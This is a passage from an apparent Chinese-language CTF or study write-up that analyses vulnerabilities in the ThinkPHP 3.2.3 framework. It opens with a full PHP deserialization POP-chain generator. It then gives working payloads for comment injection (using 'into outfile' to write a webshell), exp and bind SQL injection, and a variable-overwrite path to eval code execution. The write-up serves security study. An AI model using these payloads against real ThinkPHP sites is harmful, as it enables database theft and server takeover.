    namespace Think\Image\Driver{
        use Think\Session\Driver\Memcache;
        class Imagick
        {
            private $img;
            public function __construct()
            {
                $this->img = new Memcache();
            }
        }
    }
    namespace Think\Session\Driver{
        use  Think\Model;
        class Memcache
        {
            protected $handle;
            public function __construct()
            {
                $this->handle = new Model();
            }
        }
    }
    namespace Think{
        use Think\Db\Driver\Mysql;
        class Model
        {
            protected $options;
            protected $data;
            protected $pk;
            protected $db;
            public function __construct()
            {
                $this->db = new Mysql();
                $this->options['where'] = '';
                $this->data['id'] = array(
                    "table" => "mysql.user where 1=updatexml(1,user(),1)#",
                    "where" => "1=1"
                );
                $this->pk = 'id';
            }
        }
    }
    namespace Think\Db\Driver{
        use PDO;
        class Mysql
        {
            protected $options = array(
                PDO::MYSQL_ATTR_LOCAL_INFILE => true
            );
            protected $config = array(
                "debug"    => 1,
                "database" => "test",
                "hostname" => "127.0.0.1",
                "hostport" => "3306",
                "charset"  => "utf8",
                "username" => "root",
                "password" => "root"
            );
        }
    }
    namespace {
        echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
    }
## 0x03 注释注入
触发注释注入的调用为：`$user = M('user')->comment($id)->find(intval($id));`。
调试跟进一下，调用的是 `Think\Model.class.php` 中的 `comment`
    /**
     * 查询注释
     * @access public
     * @param string $comment 注释
     * @return Model
     */
    public function comment($comment)
    {
        $this->options['comment'] =   $comment;
        return $this;
    }
之后调用 `Think\Model` 的find方法。一直到调用了 `Think\Db\Driver.class.php` 中的
`parseComment` 函数，将我们输入的内容拼接在了注释中，于是我们可以将注释符闭合，然后插入SQL语句。此时的SQL语句为 `"SELECT *
FROM`user`WHERE`id`= 1 LIMIT 1 /* 1 */"`
    protected function parseComment($comment) {
        return  !empty($comment)?   ' /* '.$comment.' */':'';
    }
如果这里没有 `LIMIT 1` 的话我们可以直接进行union注入，但是这里有 `LIMIT 1` ，进行union注入会提示 `Incorrect
usage of UNION and LIMIT`，只有同时把union前的SQL查询语句用括号包起来才可以进行查询，但是显然我们无法做到，那么我们可以利用
`into outfile` 的拓展来进行写文件。
    "OPTION"参数为可选参数选项，其可能的取值有：
    `FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
    `FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
    `FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。
    `FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。
    `LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
    `LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
`?id=1*/ into outfile "path/1.php" LINES STARTING BY ''/*` 就可以进行写马了。
## 0x04 exp注入
触发exp注入的查询语句如下。
    public function sql()
    {
        $User = D('user');
        var_dump($_GET['id']);
        $map = array('id' => $_GET['id']);
        // $map = array('id' => I('id'));
        $user = $User->where($map)->find();
        var_dump($user);
    }
这里一路跟进到 `parseSql()` 函数，然后调用到 `parseWhere()` 。
    public function parseSql($sql,$options=array()){
        $sql   = str_replace(
            array('%TABLE%','%DISTINCT%','%FIELD%','%JOIN%','%WHERE%','%GROUP%','%HAVING%','%ORDER%','%LIMIT%','%UNION%','%LOCK%','%COMMENT%','%FORCE%'),
            array(
                $this->parseTable($options['table']),
                $this->parseDistinct(isset($options['distinct'])?$options['distinct']:false),
                $this->parseField(!empty($options['field'])?$options['field']:'*'),
                $this->parseJoin(!empty($options['join'])?$options['join']:''),
                $this->parseWhere(!empty($options['where'])?$options['where']:''),
                $this->parseGroup(!empty($options['group'])?$options['group']:''),
                $this->parseHaving(!empty($options['having'])?$options['having']:''),
                $this->parseOrder(!empty($options['order'])?$options['order']:''),
                $this->parseLimit(!empty($options['limit'])?$options['limit']:''),
                $this->parseUnion(!empty($options['union'])?$options['union']:''),
                $this->parseLock(isset($options['lock'])?$options['lock']:false),
                $this->parseComment(!empty($options['comment'])?$options['comment']:''),
                $this->parseForce(!empty($options['force'])?$options['force']:'')
            ),$sql);
        return $sql;
    }
`parseWhere()` 调用了 `parseWhereItem()` ，截取了部分关键代码，这里的 `$val`
就是我们传入的参数，所以当我们传入数组时，`$exp` 就是数组的第一个值，如果等于exp，就会使用.直接将数组的第二个值拼接上去，就会造成SQL注入。
    $exp = strtolower($val[0]);
    ......
    elseif('bind' == $exp ){ // 使用表达式
        $whereStr .= $key.' = :'.$val[1];
    }elseif('exp' == $exp ){ // 使用表达式
        $whereStr .= $key.' '.$val[1];
    }
也就是说当我们传入 `?id[0]=exp&id[1]== 1 and updatexml(1,concat(0x7e,user(),0x7e),1)`
时，拼接后的字符串就是 `"`id` = 1 and
updatexml(1,concat(0x7e,user(),0x7e),1)"`，最后的SQL语句也就成了 `"SELECT * FROM `user`
WHERE `id` =1 and updatexml(1,concat(0x7e,user(),0x7e),1) LIMIT 1
"`，可以进行报错注入了。
这里使用了全局数组 `$_GET` 来传参，而不是tp自带的 `I()` 函数，是因为在 `I()` 函数的最后有这么一句代码，
    is_array($data) && array_walk_recursive($data,'think_filter');
调用了 `think_filter()` 函数来进行过滤，刚好就过滤了 `EXP` ，在后面加上了一个空格，那么自然也就无法进行上面的流程，不能进行注入了。
    function think_filter(&$value){
        // TODO 其他安全过滤
        // 过滤查询特殊字符
        if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){
            $value .= ' ';
        }
    }
## 0x05 bind注入
    public function sql()
    {
        $User = M("user");
        $user['id'] = I('id');
        $data['password'] = I('password');
        $valu = $User->where($user)->save($data);
        var_dump($valu);
    }
payload:`?id[0]=bind&id[1]=0 and
updatexml(1,concat(0x7e,user(),0x7e),1)&password=1`
这里一路执行到上面的 `parseWhereItem()`
处，除了exp外，还有一处bind，这里同样也是用点拼接字符串，但是不同的是这里还拼接了一个冒号。也就是说拼接之后是 `"`id` = :0 and
updatexml(1,concat(0x7e,user(),0x7e),1)"` 这样的。
    $exp = strtolower($val[0]);
    ......
    elseif('bind' == $exp ){ // 使用表达式
        $whereStr .= $key.' = :'.$val[1];
    }elseif('exp' == $exp ){ // 使用表达式
        $whereStr .= $key.' '.$val[1];
    }
拼接到SQL语句后是 `"UPDATE `user` SET `password`=:0 WHERE `id` = :0 and
updatexml(1,concat(0x7e,user(),0x7e),1)"`。
随后在 `update()` 中调用了 `execute()` 函数，执行了如下代码
    if(!empty($this->bind)){
        $that   =   $this;
        $this->queryStr =   strtr($this->queryStr,array_map(function($val) use($that){ return '\''.$that->escapeString($val).'\''; },$this->bind));
    }
这里就将 `:0` 替换为了我们传入的password的值，SQL语句也就变为了 `"UPDATE `user` SET `password`='1'
WHERE `id` = '1' and updatexml(1,concat(0x7e,user(),0x7e),1)"`，所以我们在传参的时候
`id[1]` 最开始的字符传入的是0，才能去除掉冒号。最后SQL注入成功。
## 0x06 变量覆盖导致命令执行
触发rce的代码如下。
    public function test($name='', $from='ctfshow')
    {
        $this->assign($name, $from);
        $this->display('index');
    }
先调用 `assign()` 函数。
    public function assign($name, $value='')
    {
        if (is_array($name)) {
            $this->tVar   =  array_merge($this->tVar, $name);
        } else {
            $this->tVar[$name] = $value;
        }
    }
当我们传入 `?name=_content&from=` 时经过 `assign()`
函数后就有：`$this->view->tVar["_content"]=""`
`display()` 函数跟进，`$content` 获取模板内容。
    public function display($templateFile='', $charset='', $contentType='', $content='', $prefix='')
    {
        G('viewStartTime');
        // 视图开始标签
        Hook::listen('view_begin', $templateFile);
        // 解析并获取模板内容
        $content = $this->fetch($templateFile, $content, $prefix);
        // 输出模板内容
        $this->render($content, $charset, $contentType);
        // 视图结束标签
        Hook::listen('view_end');
    }
这里调用了 `fetch()` 函数，有一个if判断，如果使用了PHP原生模板就进入这个判断，这个就对应的是
`ThinkPHP\Conf\convention.php` 中的 `'TMPL_ENGINE_TYPE' => 'php',`。
    public function fetch($templateFile='', $content='', $prefix='')
    {
        if (empty($content)) {
            $templateFile   =   $this->parseTemplate($templateFile);
            // 模板文件不存在直接返回
            if (!is_file($templateFile)) {
                E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
            }
        } else {
            defined('THEME_PATH') or    define('THEME_PATH', $this->getThemePath());
        }
        // 页面缓存
        ob_start();
        ob_implicit_flush(0);
        if ('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板
            $_content   =   $content;
            // 模板阵列变量分解成为独立变量
            extract($this->tVar, EXTR_OVERWRITE);
            // 直接载入PHP模板
            empty($_content)?include $templateFile:eval('?>'.$_content);
        } else {
            // 视图解析标签
            $params = array('var'=>$this->tVar,'file'=>$templateFile,'content'=>$content,'prefix'=>$prefix);
            Hook::listen('view_parse', $params);
        }
        // 获取并清空缓存
        $content = ob_get_clean();
        // 内容过滤标签
        Hook::listen('view_filter', $content);
        // 输出模板文件
        return $content;
    }
这里进入判断后，执行了 `extract($this->tVar, EXTR_OVERWRITE);` ，而通过前面的分析得知我们已有
`$this->view->tVar["_content"]=""` ，因此这里就存在变量覆盖，将
`$_content` 覆盖为了我们输入的要执行的命令。
随后执行 `empty($_content)?include $templateFile:eval('?>'.$_content);` ，此时的
`$_content` 显然不为空，所以会执行 `eval('?>'.$_content);` ，也就造成了命令执行。
## 参考文献
[thinkphp3.2.3 sql注入分析](https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/
"thinkphp3.2.3 sql注入分析")  
[ThinkPHP v3.2.* （SQL注入&文件读取）反序列化POP链](https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA?fileGuid=YQ6W8dWWxRpgCVkt "ThinkPHP v3.2.*
（SQL注入&文件读取）反序列化POP链")  
[ Ctfshow web入门
thinkphp专题](https://blog.csdn.net/rfrder/article/details/116095677 " Ctfshow
web入门 thinkphp专题")  
[ thinkphp3.2.3
SQL注入漏洞复现](https://blog.csdn.net/rfrder/article/details/114024426 "
thinkphp3.2.3 SQL注入漏洞复现")  
[Thinkphp3 漏洞总结](https://y4er.com/post/thinkphp3-vuln/ "Thinkphp3 漏洞总结")